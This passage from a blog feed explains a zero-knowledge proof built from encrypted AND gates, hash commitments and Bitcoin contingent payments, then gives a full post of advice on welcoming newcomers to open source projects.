<p><img src="http://manishearth.github.io/images/post/and-encr-xor.png" width="500"></p>

<p>A regular AND gate has a truth table as follows:</p>

<table>
<thead>
<tr>
<th>Input 1 </th>
<th> Input 2 </th>
<th> Output</th>
</tr>
</thead>
<tbody>
<tr>
<td>0 </td>
<td> 0 </td>
<td> 0</td>
</tr>
<tr>
<td>1 </td>
<td> 0 </td>
<td> 0</td>
</tr>
<tr>
<td>0 </td>
<td> 1 </td>
<td> 0</td>
</tr>
<tr>
<td>1 </td>
<td> 1 </td>
<td> 1</td>
</tr>
</tbody>
</table>


<p><br></p>

<p>This truth table, encrypted (with the input keys \(e_1 = 1, e_2 = 0\) and output key \(e_o = 1\))
is:</p>

<table>
<thead>
<tr>
<th>Encrypted Input 1 </th>
<th> Encrypted Input 2 </th>
<th> Encrypted Output</th>
</tr>
</thead>
<tbody>
<tr>
<td>1 </td>
<td> 0 </td>
<td> 1</td>
</tr>
<tr>
<td>0 </td>
<td> 0 </td>
<td> 1</td>
</tr>
<tr>
<td>1 </td>
<td> 1 </td>
<td> 1</td>
</tr>
<tr>
<td>0 </td>
<td> 1 </td>
<td> 0</td>
</tr>
</tbody>
</table>


<p><br>
So, if the encrypted gate gets the (encrypted) inputs 1 and 0, its (encrypted) output will be 1.</p>

<p>Since XOR is its own inverse (\(x \oplus y \oplus y\) is just \(x\)), if we wish to encrypt
an input before piping it through this gate, we just XOR it with the relevant input key. If we wish
to decrypt the output, we again XOR it with the output key. The XOR gates being applied will just
cancel out with the internal encryption gates. In other words, encryption and decryption are done
with the same operation!</p>

<p>To recap, the dotted box below is an encrypted AND gate. An encrypted input enters from the left,
and is decrypted by the internal XOR gate to obtain the actual input, which is piped through the AND
gate. To encrypt an input so that it can be passed into this gate, one uses the same key with an XOR
(not shown in the diagram). Similarly, the actual output of the AND gate exits on the right, and is
encrypted by the XOR gate at the output to get the &ldquo;encrypted output&rdquo; (the wire that extends out of
the box). To decrypt this, one must apply the same XOR operation to the encrypted output to recover
the actual output of the gate.</p>

<p><img src="http://manishearth.github.io/images/post/and-encr-xor.png" width="500"></p>

<h3>Creating adaptation keys and commitments</h3>

<p>Now, unlike regular AND gates, these encrypted AND gates cannot be composed. The output of an
encrypted AND gate is encrypted, with a potentially different encryption key as to that of the next
gate&rsquo;s input. So, we insert an &ldquo;adaptation key&rdquo; between the two. For example, if the output of the
first gate is connected to the first input of the second gate, we need to insert this operation
between the two gates:</p>

<p><img src="http://manishearth.github.io/images/post/and-encr-adapt.png" width="500"></p>

<p>We XOR by \(e_o\) of the first gate (to decrypt), and then again XOR by \(e_1\) of the second gate (to
reencrypt). This operation is the same as XORing by \(e_o \oplus e_1\), which is the
&ldquo;adaptation key&rdquo;. Every pair of encrypted gates will have an adaptation key for every configuration
they can be placed in.</p>

<p>Alright. Bob creates a ton of these &ldquo;encrypted gates&rdquo;, and calculates all the adaptation keys. He
also mixes up the truth tables of each encrypted gate<sup id="fnref:8"><a href="#fn:8" rel="footnote">8</a></sup>.</p>

<p>Now, he commits to these truth tables. A commitment for each entry in each truth table is made, so
he&rsquo;ll end up with something like this:</p>

<table>
<thead>
<tr>
<th>Encrypted Input 1 </th>
<th> Encrypted Input 2 </th>
<th> Encrypted Output </th>
<th> nonce </th>
<th> commitment</th>
</tr>
</thead>
<tbody>
<tr>
<td>0 </td>
<td> 0 </td>
<td> 1 </td>
<td> .. </td>
<td> H(001 + nonce)</td>
</tr>
<tr>
<td>1 </td>
<td> 0 </td>
<td> 1 </td>
<td> .. </td>
<td> H(101 + nonce)</td>
</tr>
<tr>
<td>0 </td>
<td> 1 </td>
<td> 0 </td>
<td> .. </td>
<td> H(010 + nonce)</td>
</tr>
<tr>
<td>1 </td>
<td> 1 </td>
<td> 1 </td>
<td> .. </td>
<td> H(111 + nonce)</td>
</tr>
</tbody>
</table>


<p><br>
He also commits to each of the adaptation keys and each of the encryption keys.</p>

<p>As usual, all the commitments will be sent to Alice. Alice will then have data like: &ldquo;Commitment for
Gate 1 entry 1: .., Commitment for Gate 2 entry 2:.., &hellip; Commitment for Gate 2 entry 1: .., &hellip;.
Commitment for adaptation key between Gate 1&rsquo;s output and Gate 2&rsquo;s first input: .., Commitment for
adaptation key between Gate 1&rsquo;s output and Gate 2&rsquo;s second input: .., Commitment for encryption key
for Gate 1&rsquo;s first input, &hellip;&rdquo;.</p>

<h3>Shuffling and revealing</h3>

<p>These commitments are taken in some predefined order, and the resultant monster string is hashed
(without a nonce). This &ldquo;superhash&rdquo; is used as the seed to a pseudorandom number generator which is
used to shuffle the gates. Both Alice and Bob can calculate this shuffling.</p>

<p>This post-shuffle ordering is used after this point. The hash-shuffle is important here because it
adds a layer of tamper protection. If Bob wishes to tamper with the, say 4th gate post-shuffle, Bob
would have to create a bad gate before making the commitments; this changes the commitments, and
thus the shuffle order, and so the tampered gate will not end up being the 4th gate. Basically, it&rsquo;s
hard to control where the tampered gate will end up.</p>

<p>Now, out of the 4N  gates, Bob takes the last 2N, and reveals everything about them: Their
encryption keys, the nonces for their truth table commitments, and all adaptation keys between
these gates (along with the nonces for the adaptation key commitments).</p>

<p>Alice ensures that everything in this revealed data adds up. All the truth tables, after decryption,
should actually be AND gate truth tables. All adaptation keys must match up with their relevant
encryption keys. All commitments must match up.</p>

<h3>Double trouble!</h3>

<p>Bob duplicates the AND-and-NOT-gate based circuit. He now has two identical circuits which take
the same inputs, and have one output each. In itself this is pretty useless; this circuit is
obviously redundant. However, in the context of encrypted gates, this redundancy becomes useful.</p>

<p>Bob drops in the 2*N encrypted gates into this double-circuit, using the post-shuffle ordering of
encrypted gates and the predecided numbering<sup id="fnref:9"><a href="#fn:9" rel="footnote">9</a></sup> of the AND gates in the circuit. He puts the
necessary adaptation gates (i.e. an XOR operation with the relevant adaptation key) between
encrypted AND gates to make the circuit work. Note that each &ldquo;half&rdquo; of the circuit has a different
set of encrypted gates, and thus a different encryption key for each input. There are NOT gates here
too (from the original circuit, which was made of ANDs and NOTs); they stay in place (the adaptation
gate can go on either side of them) with no modifications or encryption.</p>

<h3>Execution</h3>

<p>Let&rsquo;s recall that Bob is claiming to have the correct input for the original circuit &ndash; the input
that makes that circuit output true.</p>

<p>Since Bob has all the encryption keys, he can encrypt this correct input to get the correct
encrypted input, which should make the new circuit output true (well, encrypted true) as well.</p>

<p>Bob goes ahead and does this. He encrypts the input (since there are different encryption keys for
either side of the circuit, he does this twice), and runs it through the circuit. He notes down the
truth table entry utilized for each gate. He ensures that the output, once decrypted, is true (it
should be, if everything has been done correctly till now).</p>

<h3>Verification</h3>

<p>He now reveals the details of the program execution to Alice. He reveals:</p>

<ul>
<li>All adaptation gates involved (and their nonces, to verify the commitments)</li>
<li>All truth table <em>entries</em> involved in the execution (and their nonces &hellip;).</li>
<li>The output encryption key (and its nonce)</li>
<li>The encrypted inputs</li>
</ul>


<p>Alice goes ahead and verifies that the commitments have not been reneged upon. Note that she also
now has a full execution history. It&rsquo;s an <em>encrypted</em> history &ndash; she can&rsquo;t calculate the original
input from it &ndash; but she can verify that the execution was faithfully carried out. While she doesn&rsquo;t
have the entire truth table for any encrypted gate, she has the entry that was used in the
execution, which is enough. She just has to ensure that the inputs to a gate match the truth table
entry, use the entry to see what the output is, apply the relevant adaptation key to get the input
for the next gate, and repeat.</p>

<p>And there you have it. Alice has verified that Bob faithfully executed her verification circuit, and
thus he must have the correct answer to her problem.</p>

<h3>Tampering?</h3>

<p>Let&rsquo;s see if it&rsquo;s possible for Bob to tamper with any of this. If Bob wishes to tamper with one of
the gates, he has to tamper with the gates before calculating commitments, which means that the
shuffling will get mixed up, which will mean that he can&rsquo;t control where the tampered gate will end
up in the final circuit. This is compounded by the fact that half the gates are revealed (so the
tampered gate may end up in the wrong set), and that there are <em>two</em> copies of the circuit (so you
need to tamper with both sides simultaneously, requiring even more luck on getting the shuffle where
you want it).</p>

<p>The probability of Bob being able to execute a succesful tamper can be adjusted by increasing the
number of revealed gates, and increasing the duplication of the circuit. There is also the
aforementioned fudge factor that can be introduced by having Alice choose where each encrypted gate
should go after Bob has already provided commitments, and finally the procedure can be repeated as
many times as necessary with a fresh set of encrypted gates to increase certainty. Unlike the graph
coloring algorithm (where the uncertainty in a single run was large &ndash; if Bob has a couple of wrong
edges there&rsquo;s relatively small chance he&rsquo;ll get caught); here in a single run it is Bob who has a
massive disadvantage, since he must tamper with <em>exactly</em> the right gates, and there&rsquo;s very little
chance that his tampered gates will fall in the right place based on Alice&rsquo;s chosen ordering.
Additionally, tampering with the gates in the first place is hard, since you need to avoid having
them get revealed. I think that with reasonable (e.g., not asking for something like 1000 duplicated
circuits) choices on the level of duplication and number of revealed gates, it&rsquo;s possible for Alice
to get a very high level of certainty without needing to conduct multiple rounds.</p>

<p>How about the opposite question: Can Alice find out anything about the input, aside from the fact
that it is correct, from the information she has? At first glance it seems like she can, because she
can see the whole path of execution. In case of a program with non-constant loops, this would be
damning, since she can figure out how many executions happened (and thus know the decrypted value
for the number of loop iterations) and backtrack using that in a cleverly-written program. However,
this program has no loops.</p>

<p>Looking at it closely, any encrypted history of execution can be changed to a different encrypted
history of execution for the same nonencrypted execution by adding NOT gates wherever they don&rsquo;t
match, and then absorbing these NOT gates into the input or output keys (by NOTing them) of the
adjacent encrypted AND gates. This means that without knowing the details of the encrypted gates,
all histories of execution are equally possible for a given actual execution<sup id="fnref:10"><a href="#fn:10" rel="footnote">10</a></sup>. Therefore,
knowing only a history of execution does not provide you further information about the actual
execution, since it could equally have been for some other history of execution.</p>

<h2>Bonus: Fixing the escrow and Bitcoin</h2>

<p>(I&rsquo;m going to assume basic knowledge of Bitcoin later on in this section)</p>

<p>After all this, we still only have a way of Bob <em>proving</em> he has a solution. There&rsquo;s no way of
securely exchanging the solution for money (or whatever) without involving a trusted third party to
handle the swap. This is known as <em>escrow</em>, where a third party is given both items for swapping;
and after checking that everything is in order the third party completes the swap.</p>

<p>We can build on this so that the third party is only trusted with the money, and cannot actually
peek at the answer.</p>

<p>It&rsquo;s pretty straightforward: Bob and Alice mutually agree on a shared secret &ldquo;pad&rdquo; P. Bob takes his
answer, bitwise-XORs it with the pad (which is of the same length as the answer) to get padded input
X, and then hashes it to get hash Y.</p>

<p>Now, initially we had a verification program which proves the statement &ldquo;This input is a solution to
Alice&rsquo;s problem&rdquo;. We modify this program so that it proves the following two statements:</p>

<ul>
<li>This input is a solution to Alice&rsquo;s problem</li>
<li>When the input is XORd with P, and subsequently hashed, the hash that comes out is Y</li>
</ul>


<p>Alice and Bob now go through the ZKP algorithm and the above is proven. Of course, they must keep
the exchange between themselves, since the value of the pad (which can be extracted from the
circuit) must remain secret.</p>

<p>Assuming that Bob isn&rsquo;t able to cause any hash collisions, Alice at this point would be happy with a
number that, when hashed, gives Y. This is something that escrow can verify, since neither Y nor X
can be reverse-engineered to get the original answer unless you have P.</p>

<p>Now, Alice puts the money in escrow, and notifies the third party handing escrow of the value of Y
(the hash). Bob puts the padded input X in escrow as well. The third party verifies that Y is the
hash of X, and releases the money to Bob and the padded input to Alice. Since Alice knows pad P, she
can XOR it with X to recover the original real input. Everyone walks away happy!</p>

<p>Well, maybe not. There still is the danger of the third party handling escrow to walk away with the
money. Why trust any one party?</p>

<p>Turns out that Bitcoin proves to be an alternative to this situation. The technique described in
<a href="https://bitcoincore.org/en/2016/02/26/zero-knowledge-contingent-payments-announcement/">Greg Maxwell&rsquo;s article</a> (called Zero-Knowledge Contingent Payment), builds upon
the above protocol using &ldquo;scripts&rdquo; in Bitcoin.</p>

<p>The way a Bitcoin transaction works is that anyone (well, the first person) who can solve the
embedded challenge is allowed to use the money contained in it. Like a piรฑata. Except with money
instead of candy and public-key cryptography instead of a stick.</p>

<p><em>Most</em> Bitcoin transactions pay directly to a person, and they use a standard kind of challenge (the
actual script is <a href="https://en.bitcoin.it/wiki/Script#Standard_Transaction_to_Bitcoin_address_.28pay-to-pubkey-hash.29">here</a>). If Alice wishes to pay Bob 5 BTC, Alice crafts a
transaction which says &ldquo;anyone with the private key behind Bob&rsquo;s public key (his address) may spend
this money&rdquo;. Of course, in practice this means that only Bob can spend the money. Alice created a
piรฑata which only Bob can break.</p>

<p>We can build on this to make the Bitcoin network behave as a trustworthy escrow. After having
stepped through the zero-knowledge protocol and being confident that Y is the hash of the padded
input, Alice crafts a transaction which says &ldquo;anyone with a string that results in this hash may
spend this money&rdquo;<sup id="fnref:11"><a href="#fn:11" rel="footnote">11</a></sup>. Bob has this string; it is the padded answer X. He makes a transaction with
X as part of the input script (so that he can claim the money); and the Bitcoin network accepts it.
Assuming Alice and Bob are not able to tamper with each others&#8217; local networks, by the time Alice
sees the transaction containing X, the network should have accepted this transaction already (though
it may not yet be part of the blockchain), and Bob should be getting his money.</p>

<p>(In case the crucial part is trusting that the escrow doesn&rsquo;t run off with the money, and you don&rsquo;t
care if other people can see the answer, you can skip the padding step and directly hash the input.
I believe the proof of concept executed in Greg&rsquo;s post did this, but I&rsquo;m not sure)</p>

<p><em>Thanks to Shantanu Thakoor, eternaleye, and ebfull for feedback on drafts of this post</em></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>I have some physics friends who would probably enjoy this too.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>Actually, you still need a trusted third party to make the money-swap work, but it can be done in a way that the National Secrets Sudoku Solution isn&rsquo;t actually shared with the third party. The Bitcoin article linked above describes a way to do away with a trusted third party, instead replacing it with the implicitly trusted Bitcoin network. We&rsquo;ll discuss this further at the end of the post.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>With free sharpener!<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>There are seven edges. This is a conservative estimate, assuming that Bob&rsquo;s graph has one bad edge. More mistakes increase this probability, but it becomes more cumbersome to calculate.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p>We basically want to be able to write this as a series of sequentially-arranged logic gates. If a loop is bounded by a constant, it can just be unrolled. <code>break</code> and <code>continue</code> can be handled here, though <code>goto</code> cannot.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
<li id="fn:6">
<p>Remember that the number of nodes and edges is already known, so we can just write a program &ldquo;Check edge 1&rdquo;, &ldquo;Check edge 2&rdquo;, &hellip; without needing to explicitly loop over everything<a href="#fnref:6" rev="footnote">&#8617;</a></p></li>
<li id="fn:7">
<p>Again, since the number being factorized is known beforehand, there are bounds on the sizes of its factors, and a multiplication circuit for a number of bounded size can be designed.<a href="#fnref:7" rev="footnote">&#8617;</a></p></li>
<li id="fn:8">
<p>mixing up a truth table doesn&rsquo;t change how it works, but it makes it impossible to figure out the original entry just by knowing that your entry was the &ldquo;third&rdquo; entry or something<a href="#fnref:8" rev="footnote">&#8617;</a></p></li>
<li id="fn:9">
<p>You can actually add another fudge factor here by making Alice decide the gate numbering after having received gate commitments. If N isn&rsquo;t that large, there&rsquo;s still a small chance Bob can fake the output by permuting the original gates (and twiddling the nonces) until the tampered gates fall into the right spot. This removes that possibility to a reasonably high level of certainty, which can be strengthened by going through the whole procedure multiple times.<a href="#fnref:9" rev="footnote">&#8617;</a></p></li>
<li id="fn:10">
<p>We&rsquo;re ignoring the commitments made by Bob here, which let us make the opposite statement &ndash; &ldquo;this encrypted history of execution is the only one that&rsquo;s possible given the commitments&rdquo;. However, the commitments themselves don&rsquo;t carry any new <em>information</em> per se; they instead lock in information which is revealed to you in the future (information which is not revealed at all cannot be reverse-engineered from the commitments, so that&rsquo;s safe too). This means that Alice cannot use them to glean anything about the decrypted input, and we can ignore them for the time being.<a href="#fnref:10" rev="footnote">&#8617;</a></p></li>
<li id="fn:11">
<p>She should probably also add a clause that requires Bob&rsquo;s private key to sign something, so that someone else can&rsquo;t copy the answer from Bob&rsquo;s transaction and steal the money. Additional work can be done to make it so that if the transaction goes unclaimed, Alice can reclaim the money.<a href="#fnref:11" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Making Your Open Source Project Newcomer-friendly]]></title>
    <link href="http://manishearth.github.io/blog/2016/01/03/making-your-open-source-project-newcomer-friendly/"/>
    <updated>2016-01-03T18:56:24-08:00</updated>
    <id>http://manishearth.github.io/blog/2016/01/03/making-your-open-source-project-newcomer-friendly</id>
    <content type="html"><![CDATA[<p>One reason I really like open source is that it offers a lot of great opportunities for newish programmers to get some hands-on experience with real world problems. There&rsquo;s only so much one can learn from small personal projects; but in open source one often gets to tackle interesting problems on large codebases &mdash; problems which wouldn&rsquo;t occur in small/personal ones. There are also valuable skills related to collaboration to be learnt.</p>

<p>Because of this, I care quite a bit about making projects welcoming to new contributions, and try to improve this experience on projects I&rsquo;m involved in. I&rsquo;ve picked up a few tricks along the way. Most of these aren&rsquo;t my ideas, I&rsquo;ve gleaned them from watching people like <a href="https://twitter.com/lastontheboat">Josh Matthews</a>, <a href="https://twitter.com/mleibovic">Margaret Leibovic</a>, <a href="https://twitter.com/mike_conley">Mike Conley</a>, and <a href="https://twitter.com/redheadedcuban">Joel Maher</a> do their thing. If you&rsquo;re interested, <a href="http://blog.margaretleibovic.com/2013/08/06/increasing-volunteer-participation-on-the-firefox.html">here</a> is a post by Margaret, and <a href="http://www.joshmatthews.net/fsoss15/contribution.html">here</a> are some of Josh&rsquo;s slides from a presentation, both on the same subject.</p>

<p>Before I get started, bear in mind that making a project &ldquo;newbie-friendly&rdquo; isn&rsquo;t something that magically happens. Like most things, it takes effort, but often this effort can come to fruition in the form of motivated contributors helping out on your project and eventually even becoming co-maintainers. It&rsquo;s really worth it!</p>

<h2>The simple stuff</h2>

<p>There&rsquo;s a lot of really easy stuff you can do to kickstart contributions to your own project. Most of this is obvious:</p>

<h3>CONTRIBUTING.md</h3>

<p><strong>Add a <code>CONTRIBUTING.md</code></strong> file. Keep it up to date. Link to it prominently from the README. The README should also have clear and detailed instructions for building the project. These two files are different &ndash; README is for those who want to use your project (perhaps by building from sources), CONTRIBUTING is for people who want to contribute.</p>

<p><strong>Mention steps for getting involved</strong>: how to find something to work on, how to send a patch/make a pull request, a checklist of things to ensure your patch/PR satisfies before submission (e.g. passing tests, commit message guidelines, etc).
Additionally, include some tips and tricks (like a link to the internal documentation) that can help new contributors, links to communication channels (IRC, Slack, Gitter, whatever) and anything else you may find helpful for someone considering contributing to your project. If you use some form of issue labeling, explanations of the labeling scheme can help folks find stuff they want to work on. An overview of the directory structure can be similarly helpful.</p>

<p>For some examples, check out the CONTRIBUTING.md files for <a href="https://github.com/servo/servo/blob/master/CONTRIBUTING.md">servo</a> and <a href="https://github.com/Manishearth/rust-clippy/blob/master/CONTRIBUTING.md">rust-clippy</a>.</p>

<h3>Maintain a list of easy bugs</h3>

<p>More on this later, but try to <strong>use some form of tagging to mark easy bugs</strong>. I love <a href="http://www.joshmatthews.net/fsoss15/contribution.html?full#issuetracker">this slide</a> from Josh&rsquo;s talk.</p>

<blockquote><p>How to politely say f*** off</p>

<p>&ldquo;Choose something to work on from our issue tracker.&rdquo; <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - every project maintainer</p></blockquote>

<p>Most bugs on issue trackers are nontrivial, steeped with jargon, devoid of actionable information, or otherwise inaccessible to the average new contributor. It&rsquo;s relatively low effort to recognize bugs which are &ldquo;easy&rdquo; for maintainers, but it&rsquo;s a lot of work for people unfamiliar to this project to figure this out.</p>

<p>A simple label on GitHub is all you need in most cases. Be sure to link to it from your contributing file!</p>

<h3>Communicate!</h3>

<p><strong>Have open channels</strong> for communication. IRC is often the favorite here, though IRC is pretty alien for people getting involved in open source for the first time. If you&rsquo;re using IRC, see if you can link to a web client (like <a href="https://wiki.mibbit.com/index.php/Widget">Mibbit</a>) with short instructions on how to join. Stuff like Gitter works too.</p>

<p>Mailing lists also work &mdash; everyone knows how to email! However, email can be intimidating to newcomers; many have a &ldquo;omg I can&rsquo;t ask my silly questions here!&rdquo; attitude which stops them from progressing.</p>

<p>Explicitly inviting questions in each issue helps here. Clippy doesn&rsquo;t have a mailing list or IRC channel (too small a project), but I encourage people working on new bugs to ping me on any communication channel they&rsquo;d like. I&rsquo;ve mentored people over email, GH issue threads, IRC, even reddit PMs, and it&rsquo;s worked out fine in each case.</p>

<p>Often folks will PM you for help. Provide help, but <strong>encourage them to ask questions</strong> in the main venue. This has the twofold benefit of showing everyone that the main channel is open to questions, and it also helps people get quicker answers since someone else can answer if you&rsquo;re not around.</p>

<h3>Recognition</h3>

<p><strong>Celebrate new contributors</strong>. Tweet about them. Mention them in blog posts. Getting a two-line patch accepted in an open source project doesn&rsquo;t sound like much, but when you&rsquo;re just getting started, it&rsquo;s a very awesome feeling. Make it more awesome! Both <a href="http://this-week-in-rust.org/">This Week In Rust</a> and <a href="https://blog.servo.org/">This Week In Servo</a> mention new contributors (sometimes we tweet about it too), and I&rsquo;ve often got very happy messages from these contributors about the mentions.</p>

<h3>Add a code of conduct</h3>

<p>A lot of folks have had bad experiences with people online, often in other open source communities and may be wary about joining others. <strong>A code of conduct</strong> is a statement that unsavory behavior won&rsquo;t be tolerated, which helps make the project more welcoming and appealing to these people, simultaneously making it a nicer place which is helpful for everyone. Of course, you should be prepared to enforce the code of conduct if the situation requires it.</p>

<p>I use the <a href="https://www.rust-lang.org/conduct.html">Rust code of conduct</a> but the <a href="http://contributor-covenant.org/">Contributor Covenant</a> is good, too. Various language/framework communities often have their own favorite code of conduct. Pick one.</p>

<h3>Empathize!</h3>

<p>We often forget how hard it is to jumpstart in something we&rsquo;re an active part of. For example, for many of us the process of making a pull request is almost second nature.</p>

<p>However, not everyone is used to these things. I&rsquo;ve seen contributors who can code well but haven&rsquo;t used Github in the past having lots of trouble making and updating a pull request. The same applies to other workflow things; like code review, version control<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>, or build system peculiarities.</p>

<p>Keep this in mind when dealing with new contributors. These are skills which can be picked up relatively quickly, but those without them will have a frustrating experience and end up asking you a lot of questions.</p>

<h2>Improving the newcomer experience</h2>

<p>Alright, now you&rsquo;ve gotten all the basics done. People now have a vague idea of how to contribute to your project. Let&rsquo;s make it more concrete.</p>

<h3>Mentoring</h3>

<p>Don&rsquo;t just leave an easy bug open. <strong>Offer to mentor it!</strong> This is a very fun and rewarding experience, and of course contributors are more likely to stick around in a project they percieve to be helpful and welcoming.</p>

<p>It&rsquo;s often better to go one step further and <strong>give tips for fixing the issue before anyone even picks it up</strong> (<a href="https://github.com/rust-lang/rust/issues/10969#issuecomment-158282317">example</a>). Communication in open source has latency &mdash; the contributor might be on the other side of the planet, or might otherwise be contributing at a different time of the day than you<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. Reducing the number of back-and-forth cycles is really helpful here, and giving some info so that a contributor can get started immediately without needing to wait for a response goes a long way in improving the newcomer experience.</p>

<p>Avoid creating a mentored bug where you yourself aren&rsquo;t certain on how to fix it. Ideally, <strong>you should know the exact steps to take to fix a bug</strong> before marking it as mentored. Don&rsquo;t divulge all the steps to the mentee, but the exercise of solving the bug yourself (without writing the code) ensures that there aren&rsquo;t any hidden traps.</p>

<p>Mostly mentorship just involves <strong>answering questions and laying out a path</strong> for the mentee. Be sure to encourage questions in the first place! A lot of people, especially students, are intimidated when joining open source and try to stay as quiet as possible. For a healthy mentorship, you want them to ask questions. A lot. Encourage this.</p>

<p>Remember that in many cases the new contributor may be intimidated by <em>you</em>. For example, I&rsquo;ve often come across new Firefox contributors (who I introduced to the project) asking me questions instead of their assigned mentor because &ldquo;the mentor works for Mozilla and is way too awesome for me to bug with questions&rdquo;. This wasn&rsquo;t something the mentor told them (Firefox mentors are all very nice and helpful people), it was a conclusion they came to on their own &mdash; one which would impede their progress on the bug.</p>

<p>One trick that helps mitigate this is encouraging questions in your main channel. When people PM me with questions on IRC, I answer their questions, but also encourage them to ask in the main IRC channel next time. This is good for everyone &mdash; It gives the channel an aura of being &ldquo;okay to ask questions in&rdquo; (if other people see that questions are being asked and answered in the channel), and it also lets other maintainers jump in to help the new contributor in case I&rsquo;m not around.</p>

<p>Once a new contributor has fixed a bug, mentorship isn&rsquo;t over &ndash; it&rsquo;s just started! See if you can find something more involved for them to work in a related area of the codebase. Get to know the contributor too, a sense of familiarity goes a long way in reducing intimidation and other friction.</p>

<h3>Tailoring process for newcomers</h3>

<p>Most open source projects have a set of hoops you have to jump through for a pull request to be accepted. These are necessary for the health of the project and pretty straightforward for existing contributors, but can be intimidating for new ones. They also add extra cycles of communication. I&rsquo;ve often seen people put up almost-working patches, and disappear after a few cycles &mdash; even though the bulk of the work was done and there were just process issues (or code nits) left over for merging; which can be quite disheartening. Reducing extra process helps mitigate this.</p>

<p>For example, Servo uses this great tool called <a href="http://reviewable.io/">Reviewable</a> for code review. Regular contributors don&rsquo;t have much friction whilst using this, so we use it wherever possible. However, for small pull requests from new contributors I avoid using Reviewable and instead opt to review directly from the GitHub interface. For these pull requests I don&rsquo;t need Reviewable&rsquo;s features, so I don&rsquo;t lose much, but now the contributor has to go through one less hoop.</p>

<p>Similarly, for rust-clippy, I often make minor fixes and run <a href="https://github.com/Manishearth/rust-clippy/blob/master/util/update_lints.py">the readme update script</a> on behalf of the contributor instead of asking them to do it themselves. I usually check out the PR locally, run <code>git merge pr-branch --no-commit --no-ff</code><sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>, make edits, commit and push. This way the PR still gets marked as merged (<code>commit --amend</code> doesn&rsquo;t do that), and the history stays bisectable.</p>

<p>OpenSSL uses a mailing list for patches, however they allow contributions via GitHub too. Most seasoned contributors probably stick to the mailing list, but new contributors can use the familiar GitHub interface if they want, reducing friction.</p>

<p>Of course, cutting down on (necessary) process should only be done for the first one or two contributions; try to educate the newcomer about your processes as time passes.</p>

<p>An alternate way to tackle this issue is to go the other way around and teach process first. Give newcomers an extremely easy bug that just involves replacing a string or some other simple one-line fix, and help them push it through the process. This way, the next time they work on something, they&rsquo;ll be familiar with the process and be able to devote more time to the actual code.</p>

<h3>Creating easy bugs</h3>

<p>At some point down this road many projects have a problem where there are people who want to contribute, but not enough suitable easy bugs.</p>

<p>One technique that has helped me create a lot of easy bugs is to just <strong>look out for separable and non-critical subfeatures when working on something</strong>. There often are things like polish or other small features which you don&rsquo;t need to include in the main pull request, but you do anyway because it&rsquo;s a few extra seconds of work. If you think it can be split out as an easy bug, go ahead and file it!</p>

<p>For example, whilst working on some <a href="https://github.com/servo/servo/commit/b677f0f4ae718c9c6953134bbed27656a6aeb48d">form issues</a>, instead of completely implementing something, I implemented just what I needed, and <a href="https://github.com/servo/servo/issues/7726">filed an easy bug</a>. <a href="https://github.com/servo/servo/issues/4534">This</a> is another bug with a very similar situation; I&rsquo;d implemented the framework for form submission, made it work with <code>&lt;input&gt;</code>, and filed an easy bug for wiring it up to <code>&lt;button&gt;</code>.</p>

<p>Sometimes you may not find a subfeature that can be split out, but you may notice something else which could be improved. <a href="https://github.com/servo/servo/issues/7517">This</a> is an example of such an issue. I was working on something else, and noticed that this area of the code could be designed better. Whilst I could have fixed it myself with very little effort as part of my other changes, I made it into an easy bug instead.</p>

<p><strong>Simple refactorings</strong> can be a source of easy bugs too. These require familiarity with the language, but not much more, so they&rsquo;re ideal for people new to the project.</p>

<p>It&rsquo;s also possible to take a hard bug and make it easier, either by partially implementing it, or giving enough hints (code links, explanations, etc) that the hard part is already taken care of.</p>

<p><strong>Avoid making &ldquo;critical&rdquo; (i.e, needs to land in a week or two) features into easy bugs</strong>. Even simple changes can take a while for new contributors (especially due to the nature of asynchronous communication, lack of time, and/or getting bogged down in the process). Easy bugs should be something which you <em>eventually</em> want, but are okay with it taking longer to solve. It&rsquo;s very disheartening for a new contributor if they are working on something and a maintainer solves it for them because it was needed to land quickly. (Given enough time this will eventually happen for some bug, in such a case see if you can provide a different bug for them to work on and apologize)</p>

<h3>Discoverability</h3>

<p>Make it super easy for newcomers to <strong>find a bug they <em>want</em> to work on</strong>; not just any easy bug!</p>

<p><a href="http://www.joshmatthews.net/bugsahoy/">Bugs Ahoy</a> and <a href="http://whatcanidoformozilla.org/">What Can I do for Mozilla</a> are both great examples of this. Servo has <a href="http://servo.github.io/servo-starters/">servo-starters</a>.</p>

<p>There are also various sites where you can list your easy bugs, some of which are listed in <a href="http://edunham.net/2015/11/04/beyond_openhatch.html">Emily&rsquo;s post</a>.</p>

<h3>Projects and more involved participation</h3>

<p>Having easy bugs and mentoring newcomers is just one step. You probably want to have these newcomers working on harder stuff, projects, and perhaps eventually maintianing/reviewing!</p>

<p>For many people these steps may not necessarily require involvement from you; I&rsquo;ve seen professional software developers move their way to being a maintainer with very little mentorship just because they&rsquo;re experienced enough to figure out how the project works on their own.</p>

<p>However, many of your contributors may be students or otherwise inexperienced; indeed they may be contributing to your project to <em>gain</em> this experience and become better developers. Such people can become valuable members of the team with some effort.</p>

<p>This mostly involves <strong>nudging people towards harder bugs and/or projects</strong>. It&rsquo;s also very valuable to maintain a list of &ldquo;student projects&rdquo; (noncritical but large bodies of work). These can be picked up by contributors or sometimes students wishing to do a project for course credit.</p>

<p>It&rsquo;s important to <strong>try and provide a logical series of issues</strong> instead of picking things randomly around the project so that the contributor can focus on one part of the codebase while starting out. If the issues all culminate in a large feature, even better.</p>

